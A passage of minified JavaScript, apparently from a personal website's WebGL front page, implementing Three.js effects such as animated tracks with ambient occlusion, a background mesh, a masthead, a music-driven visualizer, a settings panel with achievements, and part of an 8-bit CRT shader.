.5,K=.5*W[c].y+.5,O=(O+3*(G[c].x/this.width*.5+.5))/4,K=(K+3*(G[c].y/this.height*.5+.5))/4,O=O*p,K=K*w,F=t.y+(t.x-t.y)*K,O=F+(m.y+(m.x-m.y)*K-F)*O;this.buffer[D+3]=O;e?(this.buffer[D+4]=k.x,this.buffer[D+5]=k.y,this.buffer[D+6]=k.z):(f.copy(W[c]),f.applyMatrix3(a.mat3),this.buffer[D+4]=f.x,this.buffer[D+5]=f.y,this.buffer[D+6]=f.z);this.buffer[D+7]=1}return this.buffer},getAO:function(a){function b(a){return Math.max(.1,Math.min(1-.75*a))}var c=(Math.max(this.AOStart,Math.min(this.AOEnd,this.lengthMap.unmap(a)))-
this.AOStart)/this.AOStep;a=Math.min(this.AODiscs.length/2-2,Math.floor(c));c-=a;a*=2;var e=this.AODiscs[a].front,f=this.AODiscs[a+2].front,g=this.AODiscs[a].back,h=this.AODiscs[a+2].back,k=this.AODiscs[a+1].front,p=this.AODiscs[a+3].front,u=this.AODiscs[a+1].back;a=this.AODiscs[a+3].back;c=.5-.5*Math.cos(c*\u03c0);m.set(b(e+(f-e)*c),b(g+(h-g)*c),0);t.set(b(k+(p-k)*c),b(u+(a-u)*c),0)},getN:function(){return this.nProfile},getColor:function(){return this.color},generateDiscs:function(b,c){if(!this.castAO&&
!this.receiveAO)return[];var e=this.AOStep||b,g=[],f=_v(),k=_v(),m=this.travelAO||Math.max(300,this.travelOverride),p=m+(this.lengthAO||Math.min(3E3,this.lengthOverride)),t=this.lengthMap,u=(p-m)/e;this.AOStep=e;this.AOStart=m;this.AOEnd=p;if(this.castAO){for(p=0;p<u;++p){var w=this.getMatrices(t.map(m)).mat4.elements;f.set(w[12],w[13],w[14]);k.set(w[4],w[5],w[6]);h.set(w[0],w[1],w[2]).multiplyScalar(this.width/1.4);w=(e/2+this.width/1.2)/2*this.castAO;g.push(new a.Disc(f.clone().add(h),k.clone(),
w,this.receiveAO));g.push(new a.Disc(f.clone().sub(h),k.clone(),w,this.receiveAO));m+=e}this.AODiscs=g}else this.AODiscs=c;return g}};a.Track.index=0;a.Slot=function(){this.offset=-1;this.type=null};a.AmbientOcclusion=function(){this.discs=[];this.discHash={};this.range=130};a.AmbientOcclusion.prototype={build:function(a){var b=[];a.forEach(function(a){b=a.generateDiscs(50,b);this.discs=this.discs.concat(b)}.bind(this));this.discs.forEach(function(a){var b=this.hash(a);this.discHash[b]||(this.discHash[b]=
[]);this.discHash[b].push(a)}.bind(this))},hash:function(a){a=a.position;return[Math.round(a.x/this.range*.9),Math.round(a.y/this.range*.9),Math.round(a.z/this.range*.9)]},compute:function(){this.shade();this.swap();this.shade()},shade:function(){for(var a=this.discs.length,b=this.range,c=0;c<a;++c){var e=this.discs[c],k=e.absorption;g.copy(e.position);f.copy(e.normal);for(var m=this.hash(e),p=-1;1>=p;p++)for(var t=-1;1>=t;t++)for(var w=-1;1>=w;w++){var u=this.discHash[[m[0]+w,m[1]+t,m[2]+p]];if(u)for(var O=
u.length,K=0;K<O;++K){var F=u[K];if(e!=F){h.copy(F.position).sub(g);var L=h.length();if(!(L>b)){var I=0>e.normal.dot(F.normal)?"lastFront":"lastBack",I=.4+.6*Math.max(0,1-F[I]);h.normalize();var J=h.dot(F.normal),M=h.dot(e.normal),F=(1-1/Math.sqrt(F.radius*F.radius*2/(L*L)+1))*Math.abs(J)*Math.min(1,4*Math.abs(M));0<M?e.front+=F*I*k:e.back+=F*I*k}}}}}},swap:function(){for(var a=this.discs.length,b=0;b<a;++b){var c=this.discs[b];c.lastFront=c.front;c.lastBack=c.back;c.front=0;c.back=0}}};a.Disc=function(a,
b,c,e){this.position=a||_v();this.normal=b||_v();this.radius=c||1;this.absorption=e||1;this.back=this.front=this.lastBack=this.lastFront=0};a.interpolate=function(a,b,c,e,g,f,h){a=.5*(c-a);e=.5*(e-b);return h*(2*(b-c)+a+e)+f*(-3*(b-c)-2*a-e)+g*a+b};a.LengthMap=function(a){this.points=a;for(var b=this.lengths=[],c=this.accum=[0],e=a.length,f=0,h=1;h<e;++h){var k=g.subVectors(a[h],a[h-1]).length();b.push(k);c.push(f+=k)}};a.LengthMap.prototype={getLength:function(){return this.accum[this.accum.length-
1]},unmap:function(a){var b=Math.floor(Math.max(0,Math.min(this.accum.length-2,a))),c=this.accum[b];return c+(this.accum[b+1]-c)*(a-b)},map:function(a){var b=0,c=this.accum,e=c.length-2;do{var f=Math.ceil((b+e)/2);a<c[f]?e=f-1:b=f}while(0<e-b);e=c[b];return b+(a-e)/(c[b+1]-e)}}})(Acko.Effect.Tracks);Acko.Effects.push(new Acko.Effect.Tracks);Acko.Effect.Debug=function(){Acko.Effect.call(this);this.order=Infinity;this.display=null;this.last=0};
Acko.Effect.Debug.prototype=_.extend(new Acko.Effect,{build:function(a){},update:function(a){var b=Time.get();1E4<b-this.last&&(this.last=b,this.build(a))},resize:function(a){}});Acko.Effects.push(new Acko.Effect.Debug);Acko.Effect.Background=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.opacity=0;this.renderer="webgl"};
Acko.Effect.Background.prototype=_.extend(new Acko.Effect,{build:function(a){a.background=this;var b=a.scene,c=this.group=new THREE.Object3D,e=this.makeGeometry(),g=this.material=new THREE.ShaderMaterial(Acko.SolidShader),e=this.mesh=new THREE.Mesh(e,g);e.position.z=0;e.position.y=100;e.rotation.y=-.8;e.rotation.x=.4;e.rotation.z=.2;e.eulerOrder="YXZ";e.renderDepth=2E4;c.add(e);b.add(c);b.fog=this.fog=new THREE.Fog(16777215,1200,2600);this.opacity=a.doIntro?-.1:1},makeGeometry:function(){function a(a,
b,c){var e=3*w;z[e]=a.x;z[e+1]=a.y;z[e+2]=a.z;W.copy(b);W.multiply(W).add(b).normalize();C[e]=W.x;C[e+1]=W.y;C[e+2]=W.z;B[e]=c.r;B[e+1]=c.g;B[e+2]=c.b;w++}function b(a,b,c){r[q++]=y+a;r[q++]=y+c;r[q++]=y+b}function c(a,b,c,e){r[q++]=y+a;r[q++]=y+c;r[q++]=y+b;r[q++]=y+b;r[q++]=y+c;r[q++]=y+e}function e(a){a.x=0<a.x?1:-1;a.y=0<a.y?1:-1;a.z=0<a.z?1:-1}function g(a){return a[0]+rand()*(a[1]-a[0])}var f=new THREE.BufferGeometry,h=[3E3,4200],k=[-2E3,2E3],p=[17E3,2E4],m=[80,170],t=[80,170];f.attributes=
{index:{itemSize:1,array:new Uint16Array(16896)},position:{itemSize:3,array:new Float32Array(50688)},normal:{itemSize:3,array:new Float32Array(50688)},color:{itemSize:3,array:new Float32Array(50688)}};var w=0,q=0,y=0,r=f.attributes.index.array,z=f.attributes.position.array,C=f.attributes.normal.array,B=f.attributes.color.array,D=_v(),G=_v(),W=_v(),u=new THREE.Matrix4,O=new THREE.Matrix4;Acko.Palette.red.concat(Acko.Palette.blue);var K=Acko.Palette.platinum[1];rand(773239);for(var F={0:[-1300,0,0,
.3,0,0,0],1:[1200,1800,0,0,0,0,0],2:[930,1100,0,0,0,0,0],3:[2300,1400,0,.35,.1,0,0],4:[700,300,140,0,0,0,.08],5:[1040,220,140,.2,-.05,0,-.2],6:[1050,400,0,.4,.1,-.1,0],8:[800,-240,0,0,0,0,-.2],24:[0,0,-100,0,0,0,0],25:[-500,0,500,0,0,0,0],36:[0,-300,-.1,0,0,0,0]},L=0;44>L;++L){var I=(L+rand())/44*\u03c4+2.585,J=g(p),M=g(m),T=g(t),H=.2*rand()+.6,Z={r:H*K.r,g:H*K.g,b:H*K.b},Y=Math.cos(I),X=Math.sin(I),H=g(h);41<L?(G.set(I+.6*rand()+.2,.6,.8),D.set(.3*g(k)-7E3,Y*H,X*H-2E3)):39<L?(G.set(I+.6*rand()+.2,
1.6,-3.8),D.set(.3*g(k)+9E3,Y*H,X*H-4E3)):(G.set(I+.35*rand()+.175,.6,0),D.set(g(k),Y*H*.7,X*H));W.set(1,1,1);27<=L&&32>=L&&D.multiplyScalar(1.2);0==L&&D.multiplyScalar(1.1);if(1==L||2==L)D.multiplyScalar(1.1),D.x*=2.7;if(36==L||39==L)D.x-=350,D.y+=300,G.y-=.05;if(37==L||38==L)D.y-=300;37==L&&(D.y-=700);34<L&&39>=L&&(D.multiplyScalar(1.03),D.y-=200);var V;if(V=F[L])V[6]&&(Z.r+=V[6],Z.g+=V[6],Z.b+=V[6]),D.x+=V[0],D.y-=V[1],D.z+=V[2],G.x+=V[3],G.y-=V[4],G.z+=V[5];u.makeFromPositionEulerScale(D,G,"ZXY",
W);D.set(0,0,0);O.makeFromPositionEulerScale(D,G,"ZXY",W);V=\u03c4/8;for(var I=\u03c0/4,ja=0,ia=-\u03c0/2+I/2;4>ja;++ja,ia+=I)for(var pa=Math.cos(ia),wa=Math.sin(ia),H=0,Ja=V/2;8>H;++H,Ja+=V)if(Y=Math.cos(Ja),X=Math.sin(Ja),y=w,D.set(Y*pa,wa,X*pa),D.multiplyScalar(50),G.copy(D),e(G),G.x*=J,G.y*=M,G.z*=T,G.add(D).applyMatrix4(u),D.normalize().applyMatrix4(O),a(G,D,Z),0<ja){var Oa=7==H?-7:1;c(-8,Oa-8,0,Oa)}y=w;ja=[[1,1],[-1,1],[-1,-1],[1,-1]];Y=Math.cos(I/2);X=Math.sin(I/2);ja.forEach(function(b){D.set(0,
50,0);G.set(J*b[0],M,T*b[1]);G.add(D).applyMatrix4(u);D.set(.7*b[0]*X,Y,.7*b[1]*X);D.applyMatrix4(O);a(G,D,Z)});ia=2;V=8;for(H=0;8>H;++H)0!=H%ia&&b(Math.floor(H/ia),H-1-V,H-V);for(H=0;4>H;++H)pa=(H+3)%4,wa=(pa+1)*ia-1,b(H,wa-V,H*ia-V),b(H,pa,wa-V);c(0,1,3,2);Y=Math.cos(I/2);X=Math.sin(I/2);ja.forEach(function(b){D.set(0,-50,0);G.set(J*b[0],-M,T*b[1]);G.add(D).applyMatrix4(u);D.set(.7*b[0]*X,-Y,.7*b[1]*X);D.applyMatrix4(O);a(G,D,Z)});ia=2;V=32;for(H=0;8>H;++H)0!=H%ia&&b(4+Math.floor(H/ia),H-V,H-1-
V);for(H=0;4>H;++H)pa=(H+3)%4,wa=(pa+1)*ia-1,b(4+H,H*ia-V,wa-V),b(4+H,wa-V,4+pa);c(5,4,6,7)}f.offsets=[{start:0,index:0,count:q}];return f},update:function(a){var b=a.ride||a.tracks.override();this.mesh.visible=0<this.opacity;this.mesh.position.x=b?0:400;this.mesh.position.z=b?0:-400;this.mesh.rotation.y=b?-.8:-.9;this.mesh.rotation.x=.4;this.mesh.rotation.z=.2;this.mesh.scale.set(.9,.9,.9);this.opacity=a.ride&&a.audio&&276<a.audio.currentTime?this.opacity-.005:a.audio?1:this.opacity+.003;b=.5-.5*
Math.cos(Math.min(1,Math.max(0,this.opacity))*\u03c0);this.material.uniforms.opacity.value=b;this.material.uniforms.ambientCorrection.value=(a.ambientCorrection||0)+(a.ride?.3:.6);a.backgroundOpacity=b;var b=.85-.15*Math.abs(Math.cos(a.cameraController.phi)),c=1.8*a.cameraController.perspective+100;this.fog.near=(a.cameraController.perspective+100)*b;this.fog.far=c*b},resize:function(a){}});Acko.Effects.push(new Acko.Effect.Background);
Acko.Effect.Masthead=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.renderer="css3d";this.titleOpacity=this.arrowOpacity=this.showTitle=this.showArrow=1;this.display="none";this.hovered=!1};
Acko.Effect.Masthead.prototype=_.extend(new Acko.Effect,{build:function(a){a.masthead=this;var b=a.scene,c=document.getElementById("arrow"),e=document.getElementById("masthead"),g=e.cloneNode(!0),f=e.cloneNode(!0);e.parentNode.appendChild(g);e.parentNode.appendChild(f);var h=c.cloneNode(!0);c.parentNode.appendChild(h);g.className="shadow dead";f.className="shadow dead";h.className="shadow dead";var k=Time.clock(),p=0,m=e.querySelector("#play"),t=g.querySelector("#play"),w=f.querySelector("#play");
m.addEventListener("click",function(b){b.preventDefault();a.cameraController.runRide()});m.addEventListener("mouseover",function(b){t.classList.add("hover");w.classList.add("hover");a.tracks.blackhole=6.5<a.time?1:0;for(var c=b.relatedTarget,e=!1;c=c.parentNode;)if(c==m){e=!0;break}b.target!=m||e||(b=Time.clock(),5>b-k?(p++,4==p&&(this.hovered=!0)):p=0,k=b)}.bind(this));m.addEventListener("mouseout",function(b){t.classList.remove("hover");w.classList.remove("hover");a.tracks.blackhole=0});e=this.title=
new THREE.CSS3DObject(e);c=this.arrow=new THREE.CSS3DObject(c);g=this.titleShadow1=new THREE.CSS3DObject(g);f=this.titleShadow2=new THREE.CSS3DObject(f);h=this.arrowShadow=new THREE.CSS3DObject(h);b.add(e);b.add(g);b.add(f);b.add(c);b.add(h);c.position.x=-30;c.position.y=-120;c.position.z=200;c.scale.set(.7,.4032,1);c.rotation.z=-\u03c4/4;h.position.copy(c.position);h.position.z+=-3;h.rotation.copy(c.rotation);h.scale.copy(c.scale)},update:function(a){var b=a.ride?0:1,c=.5-.5*Math.cos(Math.max(0,
Math.min(1,(a.time-6.7)/.9))*\u03c0),e=Math.max(0,Math.min(1,4*Math.cos(a.cameraController.phi+.5)-2.5));a=Math.max(0,1-a.cameraLerp*a.cameraLerp*4);this.titleOpacity+=.1*(+this.showTitle-this.titleOpacity);this.arrowOpacity+=.1*(+this.showArrow-this.arrowOpacity);e=Math.max(.004,a*e*c*b);b=this.titleOpacity*e;c=b*b;e*=this.arrowOpacity;a=e*e;b!=this.lastTitleOpacity&&(this.title.element.style.opacity=b,this.titleShadow1.element.style.opacity=c,this.titleShadow2.element.style.opacity=c);e!=this.lastArrowOpacity&&
(this.arrow.element.style.opacity=e,this.arrowShadow.element.style.opacity=a);this.lastTitleOpacity=b;this.lastArrowOpacity=e;"block"!=this.display&&(this.title.element.style.display="block",this.arrow.element.style.display="block",this.titleShadow1.element.style.display="block",this.titleShadow2.element.style.display="block",this.arrowShadow.element.style.display="block");this.display="block";this.hovered&&achievement&&achievement("blkhl");this.hovered=!1},resize:function(a){var b=Math.min(1,a.viewWidth/
900),c=this.title,e=this.titleShadow1,g=this.titleShadow2;c.position.x=0;c.position.y=0;c.position.z=0;c.rotation.x=-\u03c4/8;c.rotation.y=-\u03c4/4*.42;c.eulerOrder="YXZ";var f=Math.min(1.3,.25*(1+3/b));c.scale.set(.4*f,.4*f,f);c.updateMatrixWorld();f=_v(0,0,-2.5).applyMatrix4(c.matrix);c.position.x=200-90*(1-b);c.position.y=-100-200*(1-b);c.position.z=325;a.tracks&&(a=a.tracks.blackholeCenter,a.copy(c.position),a.x+=105,a.y-=7.5);e.position.copy(c.position).add(f);e.rotation.copy(c.rotation);e.eulerOrder=
c.eulerOrder;e.scale.copy(c.scale);g.position.copy(c.position).add(f).add(f);g.rotation.copy(c.rotation);g.eulerOrder=c.eulerOrder;g.scale.copy(c.scale)}});Acko.Effects.push(new Acko.Effect.Masthead);
Acko.Effect.Visualizer=function(){Acko.Effect.call(this);this.order=-5;this.display=null;this.last=0;this.skip=25;this.fade=10;this.volume=1;this.rotate=0;this.fakelevels=[];this.level=0;this.levels=[];this.smooths=[];this.phases=[];this.finals=[];this.boosts=[];this.smoothboosts=[];this.growlCancel=[];this.playing=!1;this.lastTime=this.skip;this.refRotation=_v();this.quietFrames=0;this.q1=new THREE.Quaternion;this.slerpB=this.slerpA=this.slerpT=0};
Acko.Effect.Visualizer.prototype=_.extend(new Acko.Effect,{build:function(a){a.visualizer=this},start:function(){if(!this.playing){gl.resize(!0);this.masthead.showArrow=0;this.volume=1;this.playing=!0;this.startedAt=null;try{this.audio?(this.audio.pause(),this.audio.currentTime=0,this.audio.play()):(this.injectAudio(),this.analyzer=new ThreeAudio.Source(2048,this.audio))}catch(a){growl({type:"info",text:"<strong>Web Audio API</strong> support is required for music response."}),this.analyzer=null}}},
stop:function(){this.playing=!1;this.masthead.showArrow=1;if(this.audio)try{this.audio.currentTime=0,this.audio.pause()}catch(a){}this.cameraController.lock(0);this.volume=0;this.tracks.tracks.forEach(function(a,b){void 0!==a._length&&(a.length=a._length,a.travel=a.initial=a._initial,delete a._length,delete a._initial)})},update:function(a){this.tracks=a.tracks;this.cameraController=a.cameraController;this.background=a.background;this.masthead=a.masthead;var b=this.tracks.visibleGroup,c=this.tracks.depthGroup,
e=this.background.group;if(this.playing){!this.startedAt&&this.audio&&this.audio.currentTime>this.skip&&(this.startedAt=Time.absolute()-this.skip);var g=this.startedAt?Time.absolute()-this.startedAt:0;400>this.lastTime&&400<=g&&achievement&&achievement("hpntd");var f=this.volume*Math.min(1,Math.max(0,Math.exp(-a.scroll.y/a.pageStart*4+.3)));0>this.quietFrames&&(f=Math.min(1,1-this.quietFrames/30));var h=Math.max(0,Math.min(1,(g-this.skip)/this.fade))*Math.max(0,Math.min(1,(422-g)/this.fade));this.level+=
.05*(f-this.level);if(this.audio)try{this.audio.volume=this.level*h*Acko.globalVolume}catch(C){}var k;this.analyzer&&(this.analyzer.update(),this.analyzer.data&&(k=this.analyzer.data.freq));if(!k){k=this.fakelevels;for(var f=g/131.9,p=Math.min(1,f),m=0;1024>m;++m)k[m]=Math.min(255,.98*Math.max(0,k[m]||0)+(Math.sin(m+.3112*f+Math.cos(.735*f))+Math.sin(m+.498*f+Math.cos(.261*f)))*(1.5+p))}var t=[15,15,20,20,40,40,10,10,70,50,60,100,50,80],w=[.35,.35,.5,.5,1,1,.6,.6,3,1.7,1.9,4.5,1.8,2.1],q=[-150,-150,
0,0,0,0,200,200,200,-200,-400,-500,-500,500],y=[20,20,20,20,20,20,90,90,100,50,50,200,50,50],r=Math.max(0,Math.min(1,(g-129.7)/2)),f=Math.max(0,(g-102.5)/15),f=.5>f?f*f:f-.25;b.rotation.x=3.66*(Math.sqrt(2+f*f)/2-Math.sqrt(2)/2)+Math.sin(.133*f+.25*Math.sin(.471*f));b.rotation.y=1.74*(Math.sqrt(f+1)-1+Math.sin(.165*f+.5*Math.sin(1.411*f)));b.rotation.z=.21*f;b.rotation.y+=.2*(.5+.5*Math.cos(Math.max(-\u03c0,Math.min(\u03c0,(g-134.9)*\u03c0/20))));p=Math.min(1,Math.max(0,(g-365)/60));b.rotation.x+=
(.5-.5*Math.cos(p*\u03c0))*\u03c0*.3;b.rotation.z+=(.5-.5*Math.cos(p*\u03c0))*\u03c0*.2;var r=r*Math.max(0,Math.min(1,(180.5-g-1)/\u03c0)),z=Math.max(0,Math.min(1,(g-180.5-1)/\u03c0)),r=r+Math.max(0,Math.min(1,(g-199.65-1)/\u03c0)),z=z*Math.max(0,Math.min(1,(199.65-g-1)/\u03c0)),r=r*Math.max(0,Math.min(1,(243.65-g-1)/\u03c0)),z=z+Math.max(0,Math.min(1,(g-243.65-1)/\u03c0)),r=r+Math.max(0,Math.min(1,(g-294.85-1)/\u03c0)),z=z*Math.max(0,Math.min(1,(294.85-g-1)/\u03c0)),z=.5-.5*Math.cos(z*\u03c0),r=
.6-.6*Math.cos(r*\u03c0);this.tracks.tracks.forEach(function(b,c){if(!(13<c)){void 0===this.levels[c]&&(this.phases[c]=this.finals[c]=this.smooths[c]=this.smoothboosts[c]=0,this.levels[c]=[0,0,0],this.boosts[c]=[0,0,0]);var e=k[8*t[c]]/255*w[c]||0,e=Math.max(0,1.1*e-.1),f=this.levels[c];f.push(e);3<f.length&&f.shift();var m=f.reduce(function(a,b){return a+b},0)/f.length,e=Math.min(4,a.delta/.01666),f=.045*e,m=this.smooths[c]+=(m-this.smooths[c])*f,m=this.finals[c]+=(m-this.finals[c])*f,f=this.boosts[c];
f.push(Math.max(0,-this.finals[c]+this.smooths[c]));5<f.length&&f.shift();f=f.reduce(function(a,b){return a+b},0)/f.length;smoothBoost=this.smoothboosts[c]+=.1*(f-this.smoothboosts[c]);f=(1500*m+4*smoothBoost+y[c])*h+y[c];void 0===b._length&&(b._length=b.length,b._initial=b.initial,b.distance=0,b.speed=0);this.phases[c]+=(.01*Math.sqrt(Math.abs(m))+.0025)*e;var p=this.phases[c],e=b.initial+b._length/2-f+q[c],m=7<c?400*pow(r*(Math.sin(1+2.31*p+c+Math.cos(.181*p))+Math.sin(.718*p)),2):0,p=Math.sin(p)*
(200+f/3)*(1-.75*z)+900*z*pow(Math.sin(.64*g),.85);b.travel=e+p+m;b.length=2*f;e=.5+.5*Math.cos(Math.min(1,2*h)*\u03c0);b.travel+=(b.initial-b.travel)*e;b.length+=(b._length-b.length)*e}}.bind(this));p=Math.max(0,Math.min(1,a.scroll.y/(a.pageStart/2)*2-1.3));this.slerpT=407<g?1:p;p=407<g?.005+.095*p:.1;this.slerpA+=(this.slerpT-this.slerpA)*p;this.slerpB+=(this.slerpA-this.slerpB)*p;this.cameraController.lock(this.playing&&.01<f?.01:0);b.quaternion.setFromEuler(b.rotation,b.eulerOrder);b.quaternion.slerp(this.q1,
this.slerpB);c.rotation.copy(b.rotation);e.rotation.copy(b.rotation);c.quaternion.copy(b.quaternion);e.quaternion.copy(b.quaternion);b.useQuaternion=c.useQuaternion=e.useQuaternion=0<this.slerpB;437<g&&this.stop();this.lastTime=g}else b.useQuaternion=c.useQuaternion=e.useQuaternion=!1,b.rotation.x=0,b.rotation.y=0,b.rotation.z=0,c.rotation.copy(b.rotation),e.rotation.copy(b.rotation)},tick:function(a){this.playing&&(.05>this.level||0>this.quietFrames?this.quietFrames++:this.quietFrames=Math.min(0,
this.quietFrames),180<this.quietFrames&&(this.stop(),this.quietFrames=0))},resize:function(a){},injectAudio:function(){if(!this.audio){var a=this.audio=new Audio,b;[["audio/ogg","/audio/dangerous-days.ogg"],["audio/mpeg","/audio/dangerous-days.mp3"]].forEach(function(c){a.canPlayType(c[0])&&(b=c[1])});b?(a.style.display="none",document.body.appendChild(a),a.autoplay=!0,a.src=b,a.addEventListener("play",function(){try{a.currentTime=this.skip}catch(b){}a.volume=0;growl({type:"music",text:"<strong>Seba</strong><br>Dangerous Days",
delay:500,link:"http://www.secretoperations.com/"})}.bind(this))):growl({type:"info",text:"Your browser does not support MP3 or OGG audio playback."})}}});Acko.Effects.push(new Acko.Effect.Visualizer);
(function(){Acko.Effect.Replace=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.marginTop=0;this.camera=null;this.adopted=[];this.lastVisible=-1};Acko.Effect.Replace.prototype=_.extend(new Acko.Effect,{build:function(a){a.replace=this;this.camera=a.camera;this.group=new THREE.Object3D;a.scene.add(this.group);Acko.Behaviors.push(function(a){this.applyBehavior(a)}.bind(this))},update:function(a){function c(a,b){a.visible=b;a.children.forEach(function(a){c(a,b)})}var e=!a.ride&&(!a.visualizer.playing||
.99<a.visualizer.slerpB||0>a.visualizer.quietFrames)&&a.cameraController.bound;this.lastVisible!=e&&(this.lastVisible=e,this.adopted.forEach(function(a){c(a.object,e)}))},resize:function(a){this.marginLeft=-20;this.marginTop=-a.cameraScrollYOffset+a.pageStart-a.viewHeight/2;this.refresh()},refresh:function(){this.adopted.forEach(function(a){this.layout(a)}.bind(this))},layout:function(a){var c;c=a.element;var e=0,g=0,f=c.offsetWidth,h=c.offsetHeight;do e+=c.offsetTop||0,g+=c.offsetLeft||0,c=c.offsetParent;
while(c&&!c.classList.contains("grid"));c={top:e,left:g,width:f,height:h};e=Math.max(.001,Math.min(c.width/a.width,c.height/a.height));g=a.object.position;f=a.object.rotation;h=a.object.scale;g.set.apply(g,a.position);f.set.apply(f,a.rotation);h.set.apply(h,a.scale);g.x+=c.left-Math.min(window.innerWidth/2,480)+Math.round(c.width/2)+this.marginLeft;g.y-=c.top+Math.round(c.height/2)+this.marginTop;a.offset=c;h.multiplyScalar(e)},replace:function(a,c){c.element=a;a.style.visibility="hidden";a.onload=
function(){this.layout(c)}.bind(this);this.layout(c);this.adopted.push(c);this.group.add(c.object)},reset:function(){this.adopted.forEach(function(a){this.group.remove(a.object)}.bind(this));this.adopted=[]},applyBehavior:function(a){forEach(a.querySelectorAll("img[data-replace]"),function(a){var b=eval(a.getAttribute("data-replace"));a.removeAttribute("data-replace");var g;b.position=(g=a.getAttribute("data-position"))?eval(g):[0,0,0];b.rotation=(g=a.getAttribute("data-rotation"))?eval(g):[0,0,0];
b.scale=(g=a.getAttribute("data-scale"))?eval(g):[1,1,1];this.replace(a,b)}.bind(this))}});var a=new Acko.Effect.Replace;Acko.Effects.push(a)})();Acko.Effect.Config=function(){Acko.Effect.call(this);this.order=Infinity;this.group=null;this.opacity=0;this.renderer="webgl";this.skip=0;this.last=Infinity};
Acko.Effect.Config.prototype=_.extend(new Acko.Effect,{build:function(a){var b=this.div=document.createElement("div");b.className="config collapsed";b.style.opacity=0;document.body.appendChild(b);b.innerHTML='<div class="bg"></div><div class="achievements"></div><div class="debug"><input type="checkbox"></div><div class="status"><span class="box"></span><span class="resolution"></span></div><div class="style"><label>Style<select><option value="normal">Normal</option><option value="ssao">SSAO</option><option value="ega">EGA</option></select></label></div><div class="mute"><label>Mute Sound<input type="checkbox"></label></div><div class="fps"><label>Stats<input type="checkbox"></label></div><div class="gear"><span class="icon-gear"><span></span><span></span><span></span><span></span><span></span></span></div>';
this.resolution=b.querySelector(".resolution");this.select=b.querySelector(".style select");this.mute=b.querySelector(".mute input");this.fps=b.querySelector(".fps input");this.gear=b.querySelector(".gear");this.achievements=b.querySelector(".achievements");this.debug=b.querySelector(".debug input");this.gl=a.parent;this.compose=a.compose;this.tracks=a.tracks;a=getStorage("config");this.apply(a,!0);this.bind()},apply:function(a,b){var c=this.compose;if(a.style)switch(a.style){case "normal":c.ssao=
!1;c.eightbit=!1;break;case "ssao":c.ssao=!0;c.eightbit=!1;break;case "ega":c.ssao=!1,c.eightbit=!0}this.tracks.debug=+a.debug||0;stats.domElement.style.display=a.fps?"block":"none";Acko.globalVolume=a.mute?0:1;b&&(this.select.selectedIndex={normal:0,ssao:1,ega:2}[a.style],this.fps.checked=!!a.fps,this.mute.checked=!!a.mute,this.debug.checked=!!a.debug);this.gl.resize(!0)},bind:function(){this.select.addEventListener("change",function(){var a=this.select.options[this.select.selectedIndex].value,b=
getStorage("config");b.style=a;setStorage("config",b);this.apply(b);this.select.blur()}.bind(this));this.mute.addEventListener("change",function(){var a=this.mute.checked,b=getStorage("config");b.mute=a;setStorage("config",b);this.apply(b);this.mute.blur()}.bind(this));this.fps.addEventListener("change",function(){var a=this.fps.checked,b=getStorage("config");b.fps=a;setStorage("config",b);this.apply(b);this.fps.blur()}.bind(this));this.debug.addEventListener("change",function(){var a=this.debug.checked,
b=getStorage("config");b.debug=a;setStorage("config",b);this.apply(b);this.debug.blur()}.bind(this));this.gear.addEventListener("click",function(){var a=this.div.classList,b=a.contains("collapsed")?"remove":"add";a[b]("collapsed")}.bind(this))},tick:function(a){a.updateStats=this.fps.checked},update:function(a){8>a.time&&!a.pastMasthead?this.div.style.opacity=.5-.5*Math.cos(Math.max(0,Math.min(1,(a.time-6.7)/.9))*\u03c0):1!=this.div.style.opacity&&(this.div.style.opacity=1);if(!(this.skip%30)&&this.last!==
localStorage.achievements){this.last=localStorage.achievements;a=[];var b=getStorage("achievements"),c;for(c in b){var e=b[c],g;getAchievement(c)&&(g=getAchievement(e))&&a.push([c,'<span style="background-image: url(/achievements/'+e+'.png)" title="'+g+'"></span>'])}for(;8>a.length;)a.push([" ","<span></span>"]);a.sort(function(a,b){return a[0]<b[0]?1:-1});a=a.map(function(a){return a[1]}).join("");this.achievements.innerHTML=a}this.skip++},resize:function(a){this.resolution.innerHTML=a.width+" \u00d7 "+
a.height+" <span>"+(!a.compose.msaa||a.compose.ssao||a.compose.eightbit?a.compose.fxaa?"FXAA":"No AA":"MSAA\u00d7"+a.compose.msaa)+"</span>"}});Acko.Effects.push(new Acko.Effect.Config);Acko.globalVolume=1;Acko.EightBitShader={uniforms:{tDiffuse:{type:"t",value:null},resolution:{type:"v2",value:new THREE.Vector2(1/1024,1/512)},pixelSize:{type:"f",value:16}},vertexShader:"void main() {\ngl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}",fragmentShader:"uniform sampler2D tDiffuse;\nuniform vec2 resolution;\nuniform float pixelSize;\nvoid main() {\nvec2 uv1 = gl_FragCoord.xy * resolution - .5;\nvec2 uv2 = gl_FragCoord.xy * resolution - .5 + vec2(.01, 0);\nvec2 uv3 = gl_FragCoord.xy * resolution - .5 + vec2(0, -.01);\nvec2 crt1 = uv1 * (1.0 + dot(uv1, uv1)*.5) * .89;\nvec2 crt2 = uv2 * (1.0 + dot(uv2, uv2)*.5) * .89;\nvec2 crt3 = uv3 * (1.0 + dot(uv3, uv3)*.5) * .89;\nvec2 pixelR = floor((crt1 + vec2(.501, .5)) / resolution / pixelSize);\nvec2 pixelG = floor((crt1 + vec2(.5, .5)) / resolution / pixelSize);\nvec2 pixelB = floor((crt1 + vec2(.499, .5)) / resolution / pixelSize);\nvec4 sampleR = texture2D(tDiffuse,  pixelR * resolution * pixelSize) + mod(pixelR.x + pixelR.y, 2.0) * .006;\nvec4 sampleG = texture2D(tDiffuse,  pixelG * resolution * pixelSize) + mod(pixelG.x + pixelG.y, 2.0) * .006;\nvec4 sampleB = texture2D(tDiffuse,  pixelB * resolution * pixelSize) + mod(pixelB.x + pixelB.y, 2.0) * .006;\nvec3 sample = vec3(sampleR.r, sampleG.g, sampleB.b);\nvec3 color = floor(sample * sample * 3.0 + .5) / 3.0;\nfloat bars = sqrt(sqrt(.5-cos((crt1.y + .5) * 6.28318 / resolution.y / pixelSize)*.5))*.25+.75;\nfloat ratio = 20.0 - uv1.y * uv1.y * 10.0;\nfloat tube = length(abs(crt1)*abs(crt1)*abs(crt1)*abs(crt1));\nfloat mask = clamp(6.0 - ratio * tube * 4.0, 0.0, 1.0);\nfloat deltaX = length(abs(crt2)*abs(crt2)*abs(crt2)*abs(crt2)) - tube;\nfloat deltaY = 